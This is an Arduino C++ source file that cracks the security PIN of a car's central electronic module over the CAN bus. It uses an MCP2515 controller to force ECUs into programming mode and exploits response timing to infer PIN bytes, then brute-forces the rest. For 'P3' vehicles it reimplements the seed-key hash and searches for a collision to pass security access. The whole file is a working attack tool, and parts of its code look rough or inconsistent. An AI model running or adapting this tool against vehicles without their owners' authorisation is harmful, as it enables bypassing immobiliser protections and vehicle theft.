/* SPDX-License-Identifier: GPL-3.0 */
/*
 * Copyright (C) 2020, 2021 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *               2020 Christian Molson <christian@cmolabs.org>
 *               2020 Mark Dapoz <md@dapoz.ca>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 */

/* tunable parameters */

#define P3
#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
#define CALC_BYTES     3     /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
#define LAT_ONLY             /* choose candidates by latency only (vs latency/standard deviation) */
//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */

/* end of tunable parameters */

#include <stdio.h>

#include <Canbus.h>
#include <defaults.h>
#include <global.h>
#include <mcp2515.h>
#include <mcp2515_defs.h>
#include <HardwareSerial.h>


uint32_t cem_reply_min;
uint32_t cem_reply_avg;
uint32_t cem_reply_max;

#define AVERAGE_DELTA_MIN     -8  /* buckets to look at before the rolling average */
#define AVERAGE_DELTA_MAX     12  /* buckets to look at after the rolling average  */

#define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_250KBPS 250000      /* 250 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */



//#define printf Serial.print

#define CAN_MSG_SIZE    8       /* messages are always 8 bytes */

#define CEM_HS_ECU_ID      0x50
#define CEM_LS_ECU_ID      0x40

#define PIN_LEN         6       /* a PIN has 6 bytes */

unsigned char  shuffle_orders[4][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };

unsigned char *shuffle_order;


// Define a file descriptor for the serial output:
static FILE uartout = { 0 };

// Declare our put-character function:
static int uart_putchar (char c, FILE *stream);

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq {
  uint8_t  pinValue;    /* value used for the PIN digit */
  uint32_t latency;     /* measured latency */
  double std;
} sequence_t;

sequence_t sequence[100] = { 0 };

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock (uint32_t freq);

/* forward declarations */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
 *
 * Returns: 0 - was not sent
 */

int canMsgSend ( bool ext, uint32_t id, uint8_t *data, bool verbose)
{
  //CAN_message_t msg;
  tCAN msg;
  int ret;

  if (verbose == true) {
      printf("SEND ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
              id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
   }

  /* prepare the message to transmit */

  msg.id = id;
  msg.header.rtr = 0;
  msg.header.length = 8;
  for (int i = 0; i < 8; i++)
    msg.data[i] = data[i];


  /* send it to the appropriate bus */
  mcp2515_send_message(&msg);
  return ret;
}



/*******************************************************************************
 *
 * canMsgReceive - receive a CAN bus message
 *
 * Note: always processes messages from the high-speed bus
 *
 * Returns: true if a message was available, false otherwise
 */

bool canMsgReceive ( unsigned int *id, uint8_t *data, int wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool     ret = false;
  tCAN msg ;
  int _wait = wait;

  

    /* check if a message was available and process it */

    if (mcp2515_check_message()) 
    if(mcp2515_get_message(&msg)){

      /* process the global buffer set by can_hs.events */

      canId = msg.id;
      pData = msg.data;
      ret = true;
    } 
  


  /* save data to the caller if they provided buffers */

  if (id)
    *id = canId;

if (data)
    memcpy(data, pData, CAN_MSG_SIZE);
  /* print the message we received */

  if (verbose) {
    printf ("RECEIVE ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}

/*******************************************************************************
 *
 * binToBcd - convert an 8-bit value to a binary coded decimal value
 *
 * Returns: converted 8-bit BCD value
 */

uint8_t binToBcd (uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************
 *
 * bcdToBin - convert a binary coded decimal value to an 8-bit value
 *
 * Returns: converted 8-bit binary value
 */

uint8_t bcdToBin (uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************
 *
 * profileCemResponse - profile the CEM's response to PIN requests
 *
 * Returns: number of PINs processed per second
 */

uint32_t profileCemResponse (void)
{
  uint8_t  pin[PIN_LEN] = { 0 };
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool     verbose = false;
  uint32_t i;

  cem_reply_avg = 0;

  /* start time in milliseconds */

  start = millis ();

  /* collect the samples */

  for (i = 0; i < 1000; i++) {

    /* average calculation is more reliable using random PIN digits */

    for (int j = 0; j < PIN_LEN; j++)
      pin[j] = binToBcd(random(0, 99));

    /* try and unlock the CEM with the random PIN */

    cemUnlock (pin, NULL, &latency, verbose);

    /* keep a running total of the average latency */

    cem_reply_avg += latency / clockCyclesPerMicrosecond();
  }

  /* end time in milliseconds */

  end = millis ();

  /* calculate the average latency for a single response */

  cem_reply_avg /= 1000;

  cem_reply_min = cem_reply_avg / 2;
  cem_reply_max = cem_reply_avg + cem_reply_min;

  /* number of PINs processed per second */

  rate = 1e6 / (end - start);

  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
  return rate;
}

volatile bool intr;

/*******************************************************************************
 *
 * cemUnlock - attempt to unlock the CEM with the provided PIN
 *
 * Returns: true if the CEM was unlocked, false otherwise
 */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
  uint8_t  reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint32_t start, end, limit;
  unsigned int id;
  uint32_t maxTime = 0;

  /* shuffle the PIN and set it in the request message */

  for (int i = 0; i < PIN_LEN; i++)
    pMsgPin[shuffle_order[i]] = pin[i];

  /* maximum time to collect our samples */

  intr = false;

  /* send the unlock request */
  canMsgSend(true, 0xffffe, unlockMsg, verbose);

  /* default reply is set to indicate a failure */

  memset (reply, 0xff, sizeof(reply));

  /* see if anything came back from the CEM */

  canMsgReceive( &id, reply, 1000, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */



  /* return PIN used if the caller wants it */

  if (pinUsed != NULL) {
    memcpy (pinUsed, pMsgPin, PIN_LEN);
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

unsigned long ecu_read_part_number( unsigned char id)
{
  unsigned int _id;
  uint8_t  data[CAN_MSG_SIZE] = { 0xcb, id, 0xb9, 0xf0, 0x00, 0x00, 0x00, 0x00 };
  uint8_t rcv[CAN_MSG_SIZE];
  bool     verbose = true;
  unsigned long pn = 0;
  int ret;
  int i, j = 0;
  int frame;

  printf("Reading part number from ECU 0x%02x \n", id);
yet_again:
  canMsgSend( true, 0xffffe, data, verbose);
  i = 0;
  j++;
  frame = 0;
  if (j > 10)
    return 0;
  do {
again:
    i++;
    if (i > 20)
      goto yet_again;

    ret = canMsgReceive( &_id, rcv, 10, false);
    if (!ret)
      goto again;
    _id &= 0xffff;
    if (_id != 0x0003UL) //TODO: check if necessary
      goto again;
    
    i = 0;
    if (frame == 0 && rcv[0] & 0x80) {
      pn *= 100; pn += bcdToBin(rcv[5]);
      pn *= 100; pn += bcdToBin(rcv[6]);
      pn *= 100; pn += bcdToBin(rcv[7]);
      frame++;
    } else if (frame == 1 && !(rcv[0] & 0x40)) {
      pn *= 100; pn += bcdToBin(rcv[1]);
      frame++;
    }
  } while(frame < 2);

  printf ("Part Number: %lu\n", pn);
  return pn;
}

unsigned long ecu_read_part_number_prog( unsigned char id)
{
  unsigned int _id;
  uint8_t  data[CAN_MSG_SIZE] = { id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = true;
  unsigned long pn = 0;

  printf("Reading part number from ECU 0x%02x \n", id);

  canMsgSend(true, 0xffffe, data, verbose);
  canMsgReceive( &_id, data, 1000, verbose);

  for (int i = 0; i < 6; i++) {
    pn *= 100;
    pn += bcdToBin(data[2 + i]);
  }

  printf ("Part Number: %lu\n", pn);
  return pn;
}

/*******************************************************************************
 *
 * progModeOn - put all ECUs into programming mode
 *
 * Returns: N/A
 */

void can_prog_mode()
{
#ifdef P3
  uint8_t  data[CAN_MSG_SIZE] = { 0x02, 0x10, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00 };
#else
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
#endif
  uint32_t time = 5000;
  uint32_t delayTime = 5;
  bool     verbose = true;

  printf ("Putting all ECUs into programming mode.\n");
  printf("\n === CEM-on-the-bench users: you have %d seconds to apply CEM power! ===\n\n", time / 1000);

  while(canMsgReceive( NULL, NULL, 1, false));

  /* broadcast a series of PROG mode requests */

#ifdef P3
    canMsgSend(false, 0x7df, data, verbose);
    //canMsgSend(CAN_LS, false, 0x7df, data, verbose);
#else
    canMsgSend(CAN_HS, true, 0xffffe, data, verbose);
    canMsgSend(CAN_LS, true, 0xffffe, data, verbose);
#endif
    verbose = true;
    time -= delayTime;
    delay (delayTime);
  
  while(canMsgReceive(NULL, NULL, 1, false));
}

/*******************************************************************************
 *
 * progModeOff - reset all ECUs to get them out of programming mode
 *
 * Returns: N/A
 */

void progModeOff (void)
{
  uint8_t data[CAN_MSG_SIZE] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool    verbose = true;

  printf ("Resetting all ECUs.\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 50; i++) {
    canMsgSend (true, 0xffffe, data, verbose);
    //canMsgSend (CAN_LS, true, 0xffffe, data, verbose);

    verbose = true;
    delay (100);
  }
}

int seq_max_lat(const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

int seq_max_std(const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return (int)(100 * _b->std) - (int)(100 * _a->std);
}

/*******************************************************************************
 *
 * crackPinPosition - attempt to find a specific digit in the PIN 
 *
 * Returns: N/A
 */

void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
{
  int len = sizeof(uint32_t) * (cem_reply_max - cem_reply_min);
  uint32_t *histogram = (uint32_t *)malloc(len);
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  double std;
  uint8_t  pin1, pin2;
  uint32_t i;
  uint32_t k;
  uint32_t xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
  uint32_t xmax = cem_reply_avg + AVERAGE_DELTA_MAX;

  /* clear collected latencies */

  memset (sequence, 0, sizeof(sequence));

  printf("                   us: ");
  for (i = xmin; i < xmax; i++)
    printf("%5d ", i);
  printf("\n");

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < 100; pin1++) {
    /* set PIN digit */

    pin[pos] = binToBcd (pin1);

    /* print a progress message for each PIN digit we're processing */

    printf ("[ ");

    /* show numerial values for the known digits */

    for (i = 0; i <= pos; i++) {
      printf ("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN) {
      printf ("-- ");
      i++;
    }

    printf ("]: ");

    /* clear histogram data for the new PIN digit */

    memset (histogram, 0, len);

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++) {

      /* set PIN digit */

      pin[pos + 1] = binToBcd (pin2);

      /* collect latency measurements the PIN pair */

      for (uint32_t j = 0; j < SAMPLES; j++) {

        /* iterate the next PIN digit (third digit) */

        pin[pos + 2] = binToBcd ((uint8_t)j);

        /* try and unlock and measure the latency */

        cemUnlock (pin, NULL, &latency, verbose);

        /* calculate the index into the historgram */

        uint32_t idx = latency / clockCyclesPerMicrosecond();

        if (idx < cem_reply_min)
          idx = cem_reply_min;

        if (idx >= cem_reply_max)
          idx = cem_reply_max - 1;

        idx -= cem_reply_min;
        /* bump the count for this latency */

        histogram[idx]++;
      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0;
    pin[pos + 2] = 0;
    pin[pos + 3] = 0;

    /* clear statistical values we're calculating */

    prod = 0;
    sum  = 0;

    /* loop over the histogram values */

    for (k = xmin; k < xmax; k++)
      printf ("% 5u ", histogram[k - cem_reply_min]);

    for (k = cem_reply_min; k < cem_reply_max; k++) {
      int l = k - cem_reply_min;
      uint32_t h = histogram[l];

      if (h) {
        prod += h * k;
        sum  += h;
      }
    }

    int mean = sum / (xmax - xmin);
    long x = 0;

    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++) {
      int l = k - cem_reply_min;
      if (histogram[l])
        x += sq(histogram[l] - mean);
    }
    std = sqrt((double)x / (cem_reply_max - cem_reply_min));

    /* weighted average */

    printf (": latency % 10u; std %3.2f\n", prod, std);

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;
    sequence[pin1].std  = std;

#if defined(DUMP_BUCKETS)
    printf ("Average latency: %u\n", cem_reply_avg);

    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
      if (histogram[k] != 0) {
        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
      }
    }
#endif

  }

  /* sort the collected sequence of latencies */

  qsort (sequence, 100, sizeof(sequence_t), seq_max_lat);

  /* print the top 25 latencies and their PIN value */
  printf("best candidates ordered by latency:\n");
  for (uint32_t i = 0; i < 5; i++) {
    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }
  printf("...\n");
  for (uint32_t i = 95; i < 100; i++) {
    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }
  double lat_k_0_1   = 100.0 * (sequence[0].latency - sequence[1].latency) / sequence[1].latency;
  double lat_k_98_99 = 100.0 * (sequence[98].latency - sequence[99].latency) / sequence[99].latency;
  double lat_k_0_99  = 100.0 * (sequence[0].latency - sequence[99].latency) / sequence[99].latency;

  /* set the digit in the overall PIN */

  pin[pos] = sequence[0].pinValue;
  pin[pos + 1] = 0;
  pin[pos + 2] = 0;

  qsort (sequence, 100, sizeof(sequence_t), seq_max_std);

  /* print the top 25 latencies and their PIN value */

  printf("\nbest candidates ordered by std:\n");
  for (uint32_t i = 0; i < 5; i++) {
    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
  }
  printf("...\n");
  for (uint32_t i = 95; i < 100; i++) {
    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
  }
  double std_k_0_1   = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
  double std_k_98_99 = 100.0 * (sequence[98].std - sequence[99].std) / sequence[99].std;
  double std_k_0_99  = 100.0 * (sequence[0].std - sequence[99].std) / sequence[99].std;

  printf("\nlat_k 0-1 %3.2f%%, lat_k 98-99 %3.2f%%, lat_k 0-99 %3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
  printf("std_k 0-1 %3.2f%%, std_k 98-99 %3.2f%%, std_k 0-99 %3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);

#ifdef LAT_ONLY
    printf ("pin[%u] choose candidate: %02x (latency only)\n", pos, pin[pos]);
#else
  if (lat_k_0_99 > std_k_0_99) {
    printf("Latency has more deviation than STD\n");
    /* choose the PIN value that has the highest latency */
    printf ("pin[%u] choose candidate: %02x based on latency\n", pos, pin[pos]);
  } else {
    printf("STD has more deviation than latency\n");
    if (std_k_0_1 > std_k_98_99) {
      printf("STD[0] deviates more than STD[99]\n");
      pin[pos] = sequence[0].pinValue;
    } else {
      printf("STD[99] deviates more than STD[0]\n");
      pin[pos] = sequence[99].pinValue;
    }
    printf ("pin[%u] choose candidate: %02x based on std\n", pos, pin[pos]);
  }
#endif

  free(histogram);
}

/*******************************************************************************
 *
 * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
 *
 * Returns: N/A
 */

void cemCrackPin (uint32_t maxBytes, bool verbose)
{
  uint8_t  pin[PIN_LEN];
  uint8_t  pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate;
  uint32_t remainingBytes;
  bool     cracked = false;
  uint32_t i;

  printf ("Calculating bytes 0-%u\n", maxBytes - 1);

  /* profile the CEM to see how fast it can process requests */

  crackRate = profileCemResponse ();

  /* start time */

  start = millis ();

  /* set the PIN to all zeros */

  memset (pin, 0, sizeof(pin));

  /* try and crack each PIN position */

  for (uint32_t i = 0; i < maxBytes; i++) {
    crackPinPosition (pin, i, verbose);
  }

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */

  printf ("Candidate PIN ");

  /* show numerial values for the known digits */

  for (i=0; i < maxBytes; i++) {
    printf ("%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */

  while (i < PIN_LEN) {
    printf ("-- ");
    i++;
  }

  printf (": brute forcing bytes %u to %u (%u bytes), will take up to %u seconds\n",
          maxBytes, PIN_LEN - 1, remainingBytes,
          (uint32_t)(pow (100, remainingBytes) / crackRate));

  /* 5% of the remaining PINs to try */

  percent_5 = pow(100, remainingBytes) / 20;

  printf ("Progress: ");

  /*
   * Iterate for each of the remaining PIN bytes.
   * Each byte has a value 0-99 so we iterare for 100^remainingBytes values
   */

  for (i = 0; i < pow (100, (remainingBytes)); i++) {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (uint32_t j = maxBytes; j < PIN_LEN; j++) {
      pin[j] = binToBcd (pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock (pin, pinUsed, NULL, verbose)) {

      /* the PIN worked, print it and terminate the search */

      printf ("done\n");
      printf ("\nfound PIN: %02x %02x %02x %02x %02x %02x",
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);

      cracked = true;
      break;
    }

    /* print a periodic progress message */

    if ((i % percent_5) == 0) {
      printf ("%u%%..", percent * 5);
      percent++;
    }
  }

  /* print execution summary */

  end = millis ();
  printf ("\nPIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);

  /* validate the PIN if we were able to crack it */

  if (cracked == true) {

    uint8_t data[CAN_MSG_SIZE];
    unsigned int can_id = 0;

    printf ("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_HS_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend (true, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset (data, 0, sizeof(data));

    canMsgReceive( &can_id, data, 10, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
      printf ("PIN verified.\n");
    } else {
      printf ("PIN verification failed!\n");
    }
  }

  printf ("done\n");
}



void p3_keep_alive(bool verbose)
{
  unsigned char msg[8] = { 0x02,0x3e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00};

  canMsgSend( false, 0x7df, msg, verbose);
}

void p3_hash(unsigned char *pin, unsigned char *seed, unsigned char *hash)
{
  unsigned int n = 0xc541a9, m = 0x1212050;
  unsigned long long k;
  unsigned char *in = (unsigned char *)&k;
  struct foo {
    unsigned int n0: 4, n1: 4, n2: 4, n3: 4, n4: 4, n5: 4, n6: 4, n7: 4;
  } *out = (struct foo *)&n;
  int i;

  in[0] = seed[0];
  in[1] = seed[1];
  in[2] = seed[2];
  in[3] = pin[0];
  in[4] = pin[1];
  in[5] = pin[2];
  in[6] = pin[3];
  in[7] = pin[4];

  for (i = 0; i < 64; i++, n >>= 1, k >>= 1) {
    if ((n ^ k) & 0x1)
      n ^= m;
  }

  hash[0] = 0x10 * out->n2 + out->n1;
  hash[1] = 0x10 * out->n3 + out->n5;
  hash[2] = 0x10 * out->n0 + out->n4;
}

bool p3_cem_get_seed(unsigned char *seed, bool verbose)
{
  unsigned char req[8] = { 0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 };
  unsigned char msg[8];
  bool ret = true;
  unsigned int id;

again:
  do {
    while (canMsgReceive( NULL, NULL, 0, false));
    if (!ret) {
      delay(1000);
    }
    canMsgSend( false, 0x726, req, verbose);
    id = 0xff;
    memset(msg, 0xff, sizeof(msg));
    ret = canMsgReceive( &id, msg, 1000, verbose);
  } while (!ret);

  if (ret && id == 0x72e && msg[0] == 0x05 && msg[1] == 0x67 && msg[2] == 0x01) {
    memcpy(seed, msg + 3, 3);
    if (seed[0] == 0 && seed[1] == 0 && seed[2] == 0)
        printf("%s: what? seed 0 0 0? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", __func__, id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
  } else {
    printf("%s: what? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", __func__, id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
    can_prog_mode();
    ret = false;
    goto again;
  }

  return ret;
}

int p3_cem_send_key(unsigned char *key, bool verbose)
{
  unsigned char req[8] = { 0x05, 0x27, 0x02, key[0], key[1], key[2], 0x00, 0x00 };
  unsigned char msg[8];
  int ret = -1;
  unsigned int id;

again:
  do {
    while (canMsgReceive(NULL, NULL, 0, false));
    if (!ret) {
      delay(1000);
    }
    canMsgSend( false, 0x726, req, verbose);
    id = 0xff;
    memset(msg, 0xff, sizeof(msg));
    ret = canMsgReceive(&id, msg, 1000, verbose);
  } while (!ret);

  if (id == 0x72e && msg[0] == 0x02 && msg[1] == 0x67 && msg[2] == 0x02) {
    printf("reply: ");
    for (int i = 0; i < 8; i++)
      printf("%02x ", msg[i]);
    printf("\n");
    ret = 1;
  } else if (id == 0x72e && msg[0] == 0x03 && msg[1] == 0x27 && msg[2] == 0x35) {
    can_prog_mode();
    goto again;
  } else {
    ret = 0;
  }

out:
  return ret;
}

void p3_find_hash_collision(unsigned char *_seed, unsigned char *_key)
{
  unsigned char seed[3];
  unsigned char key[3];
  unsigned char pin[5] = { 0 };
  unsigned int i = 0;
  int ret;
  bool verbose = true;
  
  for (int p2 = 0; p2 < 0x100; p2++) {
    pin[2] = p2;
    for (int p3 = 0; p3 < 0x100; p3++) {
      pin[3] = p3;
      for (int p4 = 0; p4 < 0x100; p4++) {
        pin[4] = p4;
        if ((p4 % 10) == 0) {
          p3_keep_alive(true);
        }
retry:
        p3_cem_get_seed(seed, verbose);
        p3_hash(pin, seed, key);
      

          printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
          Serial.println(*seed);
          i = 0;
        
        ret = p3_cem_send_key(key, verbose);
        if (ret > 0)
          goto out;
        else if (ret < 0) { // need new seed
          p3_keep_alive(true);
          verbose = true;
          goto retry;
        }
        verbose = true;
        i++;
      }
    }
  }
out:
  Serial.println("hash collision found");
  printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
  memcpy(_seed, seed, 3);
  memcpy(_key, key, 3);
}

void p3_cem_crack_pin()
{
  unsigned char seed[3];
  unsigned char key[3];

  p3_find_hash_collision(seed, key);
}

bool initialized = false;

/*******************************************************************************
 *
 * setup - Arduino entry point for hardware configuration
 *
 * Returns: N/A
 */

void setup (void)
{
   while(!Serial);

      // Fill in UART file descriptor with pointer to my char-out func.
   fdev_setup_stream(&uartout, uart_putchar, NULL, _FDEV_SETUP_WRITE);
   stdout = &uartout;
  Serial.begin(115200); // For debug use
  Serial.println("CAN Read - Testing receival of CAN Bus message");
  delay(5000);

  if (Canbus.init(CANSPEED_500)) // Initialise MCP2515 CAN controller at the specified speed
    Serial.println("CAN Init ok");
  else
    Serial.println("Can't init CAN");

  delay(1000);


 // P3
  initialized = true;
  Serial.print("Initialization done.\n\n");
}

/*******************************************************************************
 *
 * loop - Arduino main loop
 *
 * Returns: N/A
 */

void loop (void)
{
  bool verbose = true;


  if (initialized)
#ifdef P3
    p3_cem_crack_pin();
#else
    cemCrackPin (CALC_BYTES, verbose);
#endif

  /* exit ECU programming mode */

  progModeOff ();

  /* all done, stop */

  for (;;) {
  }
}

// My char output function
static int uart_putchar (char c, FILE *stream)
{
   if( c == '\n' )
      Serial.write('\r');
   Serial.write(c) ;
   return 0 ;
}